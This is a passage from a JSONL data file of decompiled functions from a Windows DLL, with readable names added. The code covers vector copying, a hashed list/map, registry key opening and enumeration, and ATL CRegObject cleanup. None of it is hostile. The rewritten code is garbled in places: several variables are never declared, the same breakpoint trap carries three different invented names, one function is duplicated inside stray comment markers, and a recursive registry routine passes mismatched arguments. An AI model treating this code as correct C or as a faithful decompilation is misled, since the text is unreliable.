(int *)(current_param_element + 5)); \n            current_position = (void *)((int)current_position + 0x38); \n        }\n        *(void **)((int)this + 4) = current_position; \n    }\n    ExceptionList = ExceptionList; \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "Catch_All@1000c48c", "Address": "1000c48c", "Source Code": "void Catch_All_1000c48c(void)\n{\n    \n    function_call(*(int **)(base_pointer + -0x28));\n    \n    \n    throw_exception((int *)0x0, (byte *)0x0);\n    \n    \n    ((code *)system_call(3))();\n}"}
{"Function Name": "FUN_1000c4a0", "Address": "1000c4a0", "Source Code": "void __thiscall FUN_1000c4a0(void *this, int *param_1)\n{\n    uint security_cookie; \n    uint calculated_size; \n    int return_value;  \n    uint element_count; \n    void *current_object; \n    undefined8 *end_param_array; \n    undefined8 *current_param_element; \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &ExceptionList; \n    *(undefined4 *)this = 0; \n    *(undefined4 *)((int)this + 4) = 0; \n    *(undefined4 *)((int)this + 8) = 0; \n    element_count = (param_1[1] - *param_1) / 0x58; \n    if (element_count != 0) { \n        if (0x2e8ba2e < element_count) { \n            FUN_10005250(); \n            FUN_1001dea6(); \n            FUN_1000b610((int *)this); \n            __CxxThrowException_8((int *)0x0, (byte *)0x0); \n            return; \n        }\n        element_count = element_count * 0x58; \n        if (element_count < 0x1000) { \n            calculated_size = (element_count == 0) ? 0 : FUN_10013cf9(element_count); \n        } else {\n            calculated_size = element_count + 0x23; \n            if (calculated_size <= element_count) { \n                calculated_size = 0xffffffff; \n            }\n            return_value = FUN_10013cf9(calculated_size); \n            if (return_value == 0) { \n                FUN_10005250(); \n                return; \n            }\n            calculated_size = return_value + 0x23U & 0xffffffe0; \n            *(int *)(calculated_size - 4) = return_value; \n        }\n        *(uint *)this = calculated_size; \n        *(uint *)((int)this + 4) = calculated_size; \n        *(uint *)((int)this + 8) = *this + element_count; \n        current_object = *this; \n        end_param_array = (undefined8 *)param_1[1]; \n        current_param_element = (undefined8 *)*param_1; \n        for (; current_param_element != end_param_array; current_param_element = current_param_element + 0xb) { \n            FUN_1000c630(current_object, current_param_element); \n            FUN_1000c630((void *)((int)current_object + 0x18), current_param_element + 3); \n            FUN_1000c630((void *)((int)current_object + 0x30), current_param_element + 6); \n            *(undefined4 *)((int)current_object + 0x48) = *(undefined4 *)(current_param_element + 9); \n            *(undefined4 *)((int)current_object + 0x4c) = *(undefined4 *)((int)current_param_element + 0x4c); \n            *(undefined8 *)((int)current_object + 0x50) = current_param_element[10]; \n            current_object = (void *)((int)current_object + 0x58); \n        }\n        *(void **)((int)this + 4) = current_object; \n    }\n    ExceptionList = &ExceptionList; \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "Catch_All@1000c614", "Address": "1000c614", "Source Code": "void Catch_All_1000c614(void)\n{\n    \n    function_call(*(int **)(base_pointer + -0x28));\n    \n    \n    throw_exception((int *)0x0, (byte *)0x0);\n    \n    \n    ((code *)software_interrupt(3))();\n}"}
{"Function Name": "FUN_1000c720", "Address": "1000c720", "Source Code": "float ** __thiscall FUN_1000c720(void *this, float **param_1, ushort **param_2)\n{\n    byte *bytePointer; \n    uint doubledParam2Value;   \n    uint loopCounter;  \n    uint hashValue;  \n    int **comparisonPointer; \n    int **processingPointer; \n    ushort **parameterPointer; \n    ushort **localParameterPointer; \n    void *thisPointer; \n    \n    parameterPointer = (ushort *)0x7 < param_2[5] ? (ushort **)*param_2 : param_2;\n    doubledParam2Value = (int)param_2[4] * 2; \n    loopCounter = 0; \n    hashValue = 0x811c9dc5; \n    \n    if (doubledParam2Value != 0) {\n        do {\n            bytePointer = (byte *)(loopCounter + (int)parameterPointer); \n            loopCounter++; \n            hashValue = (*bytePointer ^ hashValue) * 0x1000193; \n        } while (loopCounter < doubledParam2Value); \n    }\n    \n    hashValue = *(uint *)((int)this + 0x18) & hashValue;\n    comparisonPointer = *(int ***)((int)this + 4); \n    localParameterPointer = (ushort **)(hashValue * 8 + 4 + *(int *)((int)this + 0xc)); \n    processingPointer = *(int ***)(*(int *)((int)this + 0xc) + hashValue * 8); \n    \n    do {\n        int **currentPointer = (processingPointer == comparisonPointer) ? comparisonPointer : *(int ***)*localParameterPointer; \n        thisPointer = this; \n        \n        if (processingPointer == currentPointer) goto LAB_1000c82c;\n        currentPointer += 2; \n        int *sixthElement = processingPointer[6]; \n        \n        if ((int *)0x7 < processingPointer[7]) {\n            currentPointer = (int **)*currentPointer; \n        }\n        \n        if (sixthElement == (int *)param_2[4]) {\n            if (sixthElement == (int *)0x0) {\nLAB_1000c800:\n                \n                if ((char)FUN_1000cc60(param_2, (ushort **)(processingPointer + 2)) == '\\0') {\n                    comparisonPointer = *(int ***)((int)thisPointer + 4); \n                }\n                goto LAB_1000c82c; \n            }\nLAB_1000c82c:\n            \n            if (processingPointer != comparisonPointer) {\n                *param_1 = (float *)processingPointer; \n                *(undefined *)(param_1 + 1) = 0; \n                return param_1; \n            }\n            int *firstElement = (int *)*comparisonPointer; \n            int *secondElement = (int *)firstElement[1]; \n            localParameterPointer = param_2; \n            int functionResult = FUN_1000cfb0((int)firstElement, (int)secondElement, comparisonPointer, &localParameterPointer); \n            \n            if (*(int *)((int)thisPointer + 8) != 0x3333332) {\n                *(int *)((int)thisPointer + 8) += 1; \n                firstElement[1] = functionResult; \n                *secondElement = functionResult; \n                \n                FUN_1000cd30(thisPointer, param_1, (ushort **)((float **)**(undefined4 **)((int)thisPointer + 4) + 2), (float **)**(undefined4 **)((int)thisPointer + 4));\n                return param_1; \n            }\n            \n            FUN_100153e7(\"list<T> too long\");\n            return (float **)(*swi(3))(); \n        }\n        ushort firstUshortValue = *(ushort *)currentPointer; \n        ushort secondUshortValue = *(ushort *)parameterPointer; \n        bool isLessThan = firstUshortValue < secondUshortValue; \n        bool isEqualTo = firstUshortValue == secondUshortValue; \n        \n        do {\n            if (!isLessThan && !isEqualTo) break; \n            if (sixthElement == (int *)0x1) goto LAB_1000c800; \n            firstUshortValue = *(ushort *)((int)parameterPointer + (int)currentPointer + (2 - (int)parameterPointer)); \n            parameterPointer = (ushort **)((int)parameterPointer + 2); \n            sixthElement = (int *)((int)sixthElement - 1); \n            isLessThan = firstUshortValue < *(ushort *)parameterPointer; \n            isEqualTo = firstUshortValue == *(ushort *)parameterPointer; \n        } while (!isLessThan); \n    } while (true); \n}"}
{"Function Name": "FUN_1000cc60", "Address": "1000cc60", "Source Code": "undefined4 FUN_1000cc60(ushort **inputArray1, ushort **inputArray2)\n{\n    \n    ushort **fifthElementParam2 = inputArray2 + 4;\n    \n    \n    ushort *fifthElementParam1 = inputArray1[4];\n    \n    \n    if ((ushort *)0x7 < inputArray2[5]) {\n        \n        inputArray2 = (ushort **)*inputArray2;\n    }\n    \n    \n    if ((ushort *)0x7 < inputArray1[5]) {\n        \n        inputArray1 = (ushort **)*inputArray1;\n    }\n    \n    \n    if (fifthElementParam1 == *fifthElementParam2) {\n        \n        if (fifthElementParam1 == (ushort *)0x0) {\n            \n            return (uint)inputArray2 & 0xffffff00;\n        }\n        \n        \n        ushort firstValueArray1 = *(ushort *)inputArray1;\n        \n        \n        ushort firstValueArray2 = *(ushort *)inputArray2;\n        \n        \n        if (firstValueArray2 <= firstValueArray1) {\n            \n            do {\n                \n                if (fifthElementParam1 == (ushort *)0x1) {\n                    \n                    return (uint)inputArray2 & 0xffffff00;\n                }\n                \n                \n                firstValueArray1 = *(ushort *)((int)inputArray1 + (2 - (int)inputArray2) + (int)inputArray2);\n                \n                \n                inputArray2 = (ushort **)((int)inputArray2 + 2);\n                \n                \n                fifthElementParam1 = (ushort *)((int)fifthElementParam1 - 1);\n            } while (firstValueArray1 < *(ushort *)inputArray2); \n        }\n    }\n    \n    \n    return CONCAT31((int3)((uint)inputArray2 >> 8), 1);\n}"}
{"Function Name": "FUN_1000ccd0", "Address": "1000ccd0", "Source Code": "void __fastcall FUN_1000ccd0(undefined4 *inputArray) \n{\n    void **currentElement = (void **)*inputArray; \n    void **endElement = (void **)inputArray[1]; \n    for (; currentElement != endElement; currentElement += 0x16) { \n        FUN_10009f90(currentElement); \n    }\n}"}
{"Function Name": "FUN_1000cd00", "Address": "1000cd00", "Source Code": "void __fastcall FUN_1000cd00(undefined4 *inputArray) \n{\n    void **currentElement = (void **)*inputArray; \n    void **endElement = (void **)inputArray[1]; \n    for (; currentElement != endElement; currentElement += 0xe) { \n        FUN_10009410(currentElement); \n    }\n}"}
{"Function Name": "FUN_1000cd30", "Address": "1000cd30", "Source Code": "void __thiscall FUN_1000cd30(void *this, float **param_1, ushort **param_2, float **param_3)\n{\n    byte *bytePointer; \n    ushort ushortValue1; \n    ushort ushortValue2; \n    float *floatPointer1; \n    float *floatPointer2; \n    int integerValue; \n    uint unsignedIntValue1; \n    uint unsignedIntValue2; \n    ushort **ushortPointerPointer; \n    float **localFloatPointer1; \n    float **localFloatPointer2; \n    uint localUnsignedIntValue; \n    uint *localUnsignedIntPointer; \n    void *localPointer; \n    undefined4 localUndefinedValue; \n    localPointer = ExceptionList; \n    localUnsignedIntPointer = &stackValue; \n    ExceptionList = &localPointer; \n    localFloatPointer1 = param_1; \n    localUndefinedValue = 0; \n    localFloatPointer2 = (float **)param_2[4]; \n    ushortPointerPointer = param_2; \n    if ((ushort *)0x7 < param_2[5]) { \n        ushortPointerPointer = (ushort **)*param_2; \n    }\n    unsignedIntValue2 = 0x811c9dc5; \n    unsignedIntValue1 = 0; \n    if ((int)localFloatPointer2 * 2 != 0) { \n        do {\n            bytePointer = (byte *)(unsignedIntValue1 + (int)ushortPointerPointer); \n            unsignedIntValue1 = unsignedIntValue1 + 1; \n            unsignedIntValue2 = (*bytePointer ^ unsignedIntValue2) * 0x1000193; \n        } while (unsignedIntValue1 < (uint)((int)localFloatPointer2 * 2)); \n    }\n    localFloatPointer3 = (float **)(*(uint *)((int)this + 0x18) & unsignedIntValue2); \n    floatPointer2 = *(float **)((int)this + 4); \n    floatPointer1 = *(float **)(*(int *)((int)this + 0xc) + (int)localFloatPointer3 * 8); \n    if (floatPointer1 != floatPointer2) { \n        floatPointer2 = **(float ***)(*(int *)((int)this + 0xc) + 4 + (int)localFloatPointer3 * 8); \n    }\n    do {\n        localObject = this; \n        localUnsignedIntValue = stackValue; \n        if (floatPointer2 == floatPointer1) { \n            localFloatPointer2 = param_3; \n            floatPointer1 = *param_3; \n            if (floatPointer2 != floatPointer1) { \n                *param_3[1] = (float)floatPointer1; \n                *(float **)floatPointer1[1] = floatPointer2; \n                *(float ***)floatPointer2[1] = param_3; \n                floatPointer3 = (float *)floatPointer2[1]; \n                floatPointer2[1] = floatPointer1[1]; \n                floatPointer1[1] = (float)param_3[1]; \n                param_3[1] = floatPointer3; \n            }\n            integerValue = *(int *)((int)this + 0xc); \n            floatPointer1 = *(float **)(integerValue + (int)localFloatPointer3 * 8); \n            if (floatPointer1 == *(float **)((int)this + 4)) { \n                *(float ***)(integerValue + (int)localFloatPointer3 * 8) = param_3; \n                *(float ***)(*(int *)((int)this + 0xc) + 4 + (int)localFloatPointer3 * 8) = param_3; \n            }\n            else if (floatPointer1 == floatPointer2) { \n                *(float ***)(integerValue + (int)localFloatPointer3 * 8) = param_3; \n            }\n            else { \n                floatPointerPointer = (float **)**(int **)(integerValue + 4 + (int)localFloatPointer3 * 8); \n                *(float ***)(integerValue + 4 + (int)localFloatPointer3 * 8) = floatPointerPointer; \n                if (floatPointerPointer != param_3) { \n                    *(undefined4 *)(*(int *)((int)this + 0xc) + 4 + (int)localFloatPointer3 * 8) =\n                    *(undefined4 *)(*(int *)(*(int *)((int)this + 0xc) + 4 + (int)localFloatPointer3 * 8) + 4); \n                }\n            }\n            localUndefinedValue = 2; \n            unsignedIntValue1 = *(uint *)((int)this + 0x1c); \n            floatValue = (float)((double)*(int *)((int)this + 8) +\n            *(double *)(&DAT_10048870 + (*(int *)((int)this + 8) >> 0x1f) * -8)) /\n            (float)((double)unsignedIntValue1 + *(double *)(&DAT_10048870 + ((int)unsignedIntValue1 >> 0x1f) * -8)); \n            if (*this <= floatValue && floatValue != *this) { \n                if (unsignedIntValue1 < 0x200) { \n                    unsignedIntValue1 = unsignedIntValue1 << 3; \n                }\n                else if (unsignedIntValue1 < 0x1fffffff) { \n                    unsignedIntValue1 = unsignedIntValue1 * 2; \n                }\n                FUN_1000b4f0(this, unsignedIntValue1); \n                integerPointer = *(int **)((int)this + 4); \n                if ((int *)*integerPointer != integerPointer) { \n                    localFloatPointer3 = (float **)integerPointer[1]; \n                    do {\n                        floatPointerPointer = (float **)**(undefined4 **)((int)this + 4); \n                        FUN_1000cd30(this, &local_34, (ushort **)(floatPointerPointer + 2), floatPointerPointer); \n                    } while (floatPointerPointer != localFloatPointer3); \n                }\n            }\n            localUnsignedIntPointer = puVar8; \n            *localFloatPointer1 = (float *)param_3; \n            *(undefined *)(localFloatPointer1 + 1) = 1; \n            LAB_1000cf69: \n            ExceptionList = localPointer; \n            ___security_check_cookie_4(localUnsignedIntValue ^ (uint)&stack0xfffffffc); \n            return; \n        }\n        floatPointer2 = (float *)floatPointer2[1]; \n        ushortPointerPointer = (ushort **)(floatPointer2 + 2); \n        if (7 < (uint)floatPointer2[7]) { \n            ushortPointerPointer = (ushort **)*ushortPointerPointer; \n        }\n    } while (param_2[4] != (ushort *)floatPointer2[6]); \n    if (localFloatPointer2 == (float **)0x0) { \n        LAB_1000ce2a: \n        *param_3[1] = (float)*param_3; \n        (*param_3)[1] = (float)param_3[1]; \n        *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1; \n        FUN_1000c270(param_3 + 2); \n        FUN_10013ceb(param_3); \n        *localFloatPointer1 = floatPointer2; \n        *(undefined *)(localFloatPointer1 + 1) = 0; \n        goto LAB_1000cf69; \n    }\n    ushortValue1 = *(ushort *)localUshortPointer; \n    ushortValue2 = *(ushort *)ushortPointerPointer; \n    if (ushortValue2 <= ushortValue1) { \n        localUshortPointer = (ushort **)((int)localUshortPointer - (int)ushortPointerPointer); \n        boolValue1 = ushortValue1 < ushortValue2; \n        boolValue2 = ushortValue1 == ushortValue2; \n        floatPointerPointer = localFloatPointer2; \n        do {\n            if (!boolValue1 && !boolValue2) break; \n            if (floatPointerPointer == (float **)0x1) goto LAB_1000ce2a; \n            ushortPointerPointer = (ushort **)((int)ushortPointerPointer + 2); \n            floatPointerPointer = (float **)((int)floatPointerPointer + -1); \n            boolValue1 = *(ushort *)((int)ushortPointerPointer + (int)localUshortPointer) < *(ushort *)ushortPointerPointer; \n            boolValue2 = *(ushort *)((int)ushortPointerPointer + (int)localUshortPointer) == *(ushort *)ushortPointerPointer; \n        } while (!boolValue1); \n    }\n}"}
{"Function Name": "Catch_All@1000d046", "Address": "1000d046", "Source Code": "void Catch_All_1000d046(void)\n{\n    \n    function_call(*(void **)(base_pointer + 0xc));\n    \n    \n    throw_exception((int *)0x0, (byte *)0x0);\n    \n    \n    ((code *)system_call(3))();\n}"}
{"Function Name": "FUN_1000d060", "Address": "1000d060", "Source Code": "void __thiscall FUN_1000d060(void *this, int *outputParam, int *inputParam)\n{\n    byte *bytePointer; \n    int index; \n    uint counter = 0; \n    uint hashValue = 0x811c9dc5; \n    int *intPointer1; \n    int *intPointer2 = inputParam + 2; \n    \n    if (7 < (uint)inputParam[7]) {\n        intPointer2 = (int *)inputParam[2]; \n    }\n    \n    if (inputParam[6] * 2 != 0) {\n        do {\n            bytePointer = (byte *)(counter + (int)intPointer2); \n            counter++; \n            hashValue = (*bytePointer ^ hashValue) * 0x1000193; \n        } while (counter < (uint)(inputParam[6] * 2)); \n    }\n    \n    index = (*(uint *)((int)this + 0x18) & hashValue) * 8; \n    intPointer2 = *(int **)(*(int *)((int)this + 0xc) + index); \n    intPointer1 = (int *)(*(int *)((int)this + 0xc) + index); \n    \n    if ((int *)intPointer1[1] == inputParam) {\n        \n        if (intPointer2 == inputParam) {\n            *intPointer1 = *(int *)((int)this + 4); \n            *(undefined4 *)(index + 4 + *(int *)((int)this + 0xc)) = *(undefined4 *)((int)this + 4); \n        } else {\n            intPointer1[1] = inputParam[1]; \n        }\n    } else if (intPointer2 == inputParam) {\n        *intPointer1 = *inputParam; \n    }\n    \n    *(int *)inputParam[1] = *inputParam; \n    *(int *)(*inputParam + 4) = inputParam[1]; \n    *(int *)((int)this + 8) = *(int *)((int)this + 8) - 1; \n    FUN_1000c270((void **)(inputParam + 2)); \n    FUN_10013ceb(inputParam); \n    *outputParam = *inputParam; \n    return; \n}"}
{"Function Name": "FUN_1000d120", "Address": "1000d120", "Source Code": "void FUN_1000d120(void *input_param) \n{\n    FUN_10013ceb(input_param); \n}"}
{"Function Name": "FUN_1000d140", "Address": "1000d140", "Source Code": "void FUN_1000d140(int input_value_1, int input_value_2)\n{\n    \n    int *int_pointer = (int *)FUN_10013cf9(0x50);\n    \n    \n    if (input_value_1 == 0) {\n        \n        *int_pointer = (int)int_pointer;\n        \n        int_pointer[1] = (int)int_pointer;\n    } else {\n        \n        *int_pointer = input_value_1;\n        \n        int_pointer[1] = input_value_2;\n    }\n}"}
{"Function Name": "FUN_1000d170", "Address": "1000d170", "Source Code": "int __cdecl FUN_1000d170(wchar_t *inputString, uint formatLength, wchar_t *outputString)\n{\n    undefined4 *functionResultPointer; \n    int returnValue; \n    char *stackPointer = &stack0x00000010; \n    functionResultPointer = (undefined4 *)FUN_10001570(); \n    returnValue = ___stdio_common_vswprintf_s(*functionResultPointer, functionResultPointer[1], inputString, formatLength, outputString, 0, stackPointer); \n    return (returnValue < 0) ? -1 : returnValue; \n}"}
{"Function Name": "FUN_1000d1b0", "Address": "1000d1b0", "Source Code": "undefined4 __cdecl FUN_1000d1b0(undefined4 input_value)\n{\n    uint intermediate_result;          \n    code *function_pointer;       \n    uint *uint_pointer;       \n    switch(input_value) {   \n    case 0:            \n    case 0x50:        \n        return input_value; \n    default:          \n        FUN_10007c20(0x80004005); \n    case 0xc:         \n        FUN_10007c20(0x8007000e); \n    case 0x16:        \n    case 0x22:        \n        uint_pointer = (uint *)FUN_10007c20(0x80070057); \n        *uint_pointer = *uint_pointer << 1 | (uint)((int)*uint_pointer < 0); \n        *uint_pointer = *uint_pointer << 1 | (uint)((int)*uint_pointer < 0); \n        *uint_pointer = *uint_pointer << 1 | (uint)((int)*uint_pointer < 0); \n        intermediate_result = *uint_pointer; \n        *uint_pointer = *uint_pointer << 1 | (uint)((int)intermediate_result < 0); \n        *(char *)uint_pointer = *(char *)uint_pointer + (char)uint_pointer + ((int)intermediate_result < 0); \n        function_pointer = (code *)swi(3); \n        return (*function_pointer)(); \n    }\n}"}
{"Function Name": "FUN_1000d250", "Address": "1000d250", "Source Code": "DWORD FUN_1000d250(void) \n{\n    DWORD lastErrorCode = GetLastError(); \n    if (lastErrorCode > 0) { \n        lastErrorCode |= 0x80070000; \n    }\n    return lastErrorCode; \n}"}
{"Function Name": "FUN_1000d270", "Address": "1000d270", "Source Code": "uint __fastcall FUN_1000d270(uint input_value)\n{\n    \n    if (input_value < 1) {\n        \n        return input_value;\n    }\n    \n    return input_value & 0xffff | 0x80070000;\n}"}
{"Function Name": "FUN_1000d420", "Address": "1000d420", "Source Code": "void __thiscall FUN_1000d420(void *this, HKEY param_1, LPCWSTR param_2, uint param_3)\n{\n    int *integerPointer; \n    uint securityCheckValue; \n    HMODULE moduleHandle; \n    int registryResult; \n    FARPROC functionPointer; \n    HKEY registryKeyHandle; \n    uint securityCookie; \n    \n    securityCheckValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    securityCookie = securityCheckValue; \n    integerPointer = *(int **)((int)this + 8); \n    registryKeyHandle = (HKEY)0x0; \n    \n    if (integerPointer == (int *)0x0) {\n        \n        registryResult = RegOpenKeyExW(param_1, param_2, 0, param_3, &registryKeyHandle);\n    } else {\n        \n        if (*integerPointer == 0 && integerPointer[1] == 0) {\n            registryResult = 1; \n        } else {\n            \n            moduleHandle = GetModuleHandleW(L\"Advapi32.dll\");\n            if (moduleHandle == (HMODULE)0x0) {\n                registryResult = 1; \n            } else {\n                \n                functionPointer = GetProcAddress(moduleHandle, \"RegOpenKeyTransactedW\");\n                if (functionPointer != (FARPROC)0x0) {\n                    \n                    registryResult = (*functionPointer)(param_1, param_2, 0, param_3, &registryKeyHandle, *integerPointer, 0, securityCheckValue);\n                } else {\n                    registryResult = 1; \n                }\n            }\n        }\n    }\n    \n    if (registryResult == 0) {\n        \n        if (*this != (HKEY)0x0) {\n            RegCloseKey(*this); \n        }\n        *(HKEY *)this = registryKeyHandle; \n        *(uint *)((int)this + 4) = param_3 & 0x300; \n    }\n    \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_1000d510", "Address": "1000d510", "Source Code": "void __thiscall FUN_1000d510(void *this, LPCWSTR param_1)\n{\n    int returnValue; \n    HKEY registryKeyHandle = (HKEY)0x0; \n    DWORD bufferSize = 0x100; \n    WCHAR registryKeyNameBuffer[258]; \n    uint securityCookie = DAT_1004e008 ^ (uint)&registryKeyHandle; \n    \n    if (FUN_1000d420(&registryKeyHandle, *this, param_1, *(uint *)((int)this + 4) | 0x2001f) == 0) {\n        while (true) { \n            \n            returnValue = RegEnumKeyExW(registryKeyHandle, 0, registryKeyNameBuffer, &bufferSize, (LPDWORD)0x0, (LPWSTR)0x0, (LPDWORD)0x0, &local_218);\n            if (returnValue != 0) { \n                break;\n            }\n            \n            returnValue = FUN_1000d510(&registryKeyHandle, registryKeyNameBuffer);\n            if (returnValue != 0) { \n                break;\n            }\n        }\n    }\n    \n    if (registryKeyHandle != (HKEY)0x0) {\n        RegCloseKey(registryKeyHandle);\n    }\n    \n    ___security_check_cookie_4(securityCookie ^ (uint)&registryKeyHandle);\n}"}
{"Function Name": "FUN_1000d680", "Address": "1000d680", "Source Code": "void __thiscall FUN_1000d680(void *this, undefined8 *param_1, undefined8 *param_2)\n{\n    uint calculatedSizeParam2; \n    short shortValue; \n    uint securityCheckValue; \n    undefined8 *allocatedMemoryParam1; \n    undefined8 *allocatedMemoryParam2; \n    undefined4 functionResult; \n    int startPointParam2; \n    int indexValue; \n    uint calculatedSizeParam1; \n    void *originalExceptionListPointer; \n    originalExceptionListPointer = ExceptionList; \n    securityCheckValue = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &originalExceptionListPointer; \n    \n    if ((param_1 != (undefined8 *)0x0) && (param_2 != (undefined8 *)0x0)) {\n        undefined8 *traversePointerParam1 = param_1; \n        do {\n            shortValue = *(short *)traversePointerParam1; \n            traversePointerParam1 = (undefined8 *)((int)traversePointerParam1 + 2); \n        } while (shortValue != 0); \n        calculatedSizeParam1 = ((int)traversePointerParam1 - ((int)param_1 + 2) >> 1) * 2 + 2; \n        traversePointerParam1 = param_2; \n        allocatedMemoryParam1 = (undefined8 *)FUN_100141c0(-(uint)((int)((ulonglong)calculatedSizeParam1 * 2 >> 0x20) != 0) | (uint)((ulonglong)calculatedSizeParam1 * 2)); \n        localFlag = 0; \n        startPointParam2 = (int)param_2 + 2; \n        do {\n            shortValue = *(short *)param_2; \n            param_2 = (undefined8 *)((int)param_2 + 2); \n        } while (shortValue != 0); \n        calculatedSizeParam2 = ((int)param_2 - startPointParam2 >> 1) * 2 + 2; \n        allocatedMemoryParam2 = (undefined8 *)FUN_100141c0(-(uint)((int)((ulonglong)calculatedSizeParam2 * 2 >> 0x20) != 0) | (uint)((ulonglong)calculatedSizeParam2 * 2)); \n        localFlag = 1; \n        \n        if ((allocatedMemoryParam1 != (undefined8 *)0x0) && (allocatedMemoryParam2 != (undefined8 *)0x0)) {\n            functionResult = FUN_10012be0(allocatedMemoryParam1, calculatedSizeParam1, param_1, calculatedSizeParam1); \n            FUN_1000d1b0(functionResult); \n            functionResult = FUN_10012be0(allocatedMemoryParam2, calculatedSizeParam2, traversePointerParam1, calculatedSizeParam2); \n            FUN_1000d1b0(functionResult); \n            startPointParam2 = FUN_100254a4(*this, -(uint)(0xfffffffe < *(uint *)((int)this + 8)) | *(uint *)((int)this + 8) + 1, 4); \n            if (startPointParam2 != 0) { \n                *(int *)this = startPointParam2; \n                startPointParam2 = FUN_100254a4(*(LPCVOID *)((int)this + 4), -(uint)(0xfffffffe < *(uint *)((int)this + 8)) | *(uint *)((int)this + 8) + 1, 4); \n                if (startPointParam2 != 0) { \n                    indexValue = *(int *)((int)this + 8) * 4; \n                    *(int *)((int)this + 4) = startPointParam2; \n                    undefined4 *pointerToPosition = (undefined4 *)(*this + indexValue); \n                    if (pointerToPosition != (undefined4 *)0x0) { \n                        *pointerToPosition = allocatedMemoryParam1; \n                        startPointParam2 = *(int *)((int)this + 4); \n                    }\n                    pointerToPosition = (undefined4 *)(indexValue + startPointParam2); \n                    if (pointerToPosition != (undefined4 *)0x0) { \n                        *pointerToPosition = allocatedMemoryParam2; \n                    }\n                    *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1; \n                }\n            }\n        }\n    }\n    thunk_FUN_1001dc78(allocatedMemoryParam2); \n    thunk_FUN_1001dc78(allocatedMemoryParam1); \n    ExceptionList = originalExceptionListPointer; \n    ___security_check_cookie_4(securityCheckValue ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_1000d8e0", "Address": "1000d8e0", "Source Code": "void __fastcall FUN_1000d8e0(int input_param)\n{\n    \n    free_memory(*(LPVOID *)(input_param + 8));\n}"}
{"Function Name": "FUN_1000d9a0", "Address": "1000d9a0", "Source Code": "void __thiscall FUN_1000d9a0(void *objectReference, undefined8 *inputArray)\n{\n    short shortValue; \n    uint cookieValue; \n    undefined8 *currentPointer; \n    \n    cookieValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    ExceptionList = ExceptionList; \n    \n    if (inputArray != (undefined8 *)0x0) {\n        currentPointer = inputArray; \n        do {\n            shortValue = *(short *)currentPointer; \n            currentPointer = (undefined8 *)((int)currentPointer + 2); \n        } while (shortValue != 0); \n        \n        FUN_1000d8f0(objectReference, inputArray, (int)currentPointer - ((int)inputArray + 2) >> 1);\n    }\n    \n    ___security_check_cookie_4(cookieValue ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_1000da60", "Address": "1000da60", "Source Code": "void __fastcall FUN_1000da60(undefined4 *regObjectParams)\n{\n    \n    void **secondElementPointer = (void **)(regObjectParams + 1);\n    \n    \n    *regObjectParams = ATL::CRegObject::vftable;\n    \n    \n    FUN_1000d850(secondElementPointer);\n    \n    \n    FUN_1000d850(secondElementPointer);\n    \n    \n    if (*secondElementPointer != (void *)0x0) {\n        \n        FUN_1001dc78(*secondElementPointer);\n        \n        \n        *secondElementPointer = (void *)0x0;\n    }\n    \n    \n    if ((void *)regObjectParams[2] != (void *)0x0) {\n        \n        FUN_1001dc78((void *)regObjectParams[2]);\n        \n        \n        regObjectParams[2] = 0;\n    }\n    \n    \n    regObjectParams[3] = 0;\n}"}
{"Function Name": "FUN_1000dab0", "Address": "1000dab0", "Source Code": "\\*\nundefined4 * __thiscall FUN_1000dab0(void *object, byte flag)\n{\n    \n    *(undefined ***)object = ATL::CRegObject::vftable;\n    \n    FUN_1000d850((void **)((int)object + 4));\n    \n    if (*(void **)((int)object + 4) != (void *)0x0) {\n        \n        FUN_1001dc78(*(void **)((int)object + 4));\n        \n        *(undefined4 *)((int)object + 4) = 0;\n    }\n    \n    if (*(void **)((int)object + 8) != (void *)0x0) {\n        \n        FUN_1001dc78(*(void **)((int)object + 8));\n        \n        *(undefined4 *)((int)object + 8) = 0;\n    }\n    \n    *(undefined4 *)((int)object + 0xc) = 0;\n    \n    if ((flag & 1) != 0) {\n        \n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_1000dab0(void *object, byte flag)\n{\n    *(undefined ***)object = ATL::CRegObject::vftable;\n    FUN_1000d850((void **)((int)object + 4));\n    if (*(void **)((int)object + 4) != (void *)0x0) {\n        FUN_1001dc78(*(void **)((int)object + 4));\n        *(undefined4 *)((int)object + 4) = 0;\n    }\n    if (*(void **)((int)object + 8) != (void *)0x0) {\n        FUN_1001dc78(*(void **)((int)object + 8));\n        *(undefined4 *)((int)object + 8) = 0;\n    }\n    *(undefined4 *)((int)object + 0xc) = 0;\n    if ((flag & 1) != 0) {\n        FUN_10013ceb(object);\n    }\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_1000db20", "Address": "1000db20", "Source Code": "void FUN_1000db20(int input_value, undefined8 *pointer_a, undefined8 *pointer_b)\n{\n    uint security_cookie; \n    void *original_exception_list; \n    original_exception_list = exception_list_pointer; \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    exception_list_pointer = &original_exception_list; \n    if (pointer_a != (undefined8 *)0x0 && pointer_b != (undefined8 *)0x0) { \n        FUN_1000d680((void *)(input_value + 4), pointer_a, pointer_b); \n    }\n    exception_list_pointer = original_exception_list; \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "Catch_All@1000dd0c", "Address": "1000dd0c", "Source Code": "undefined * catchAllFunction(void)\n{\n    \n    return &dataVariable;\n}"}
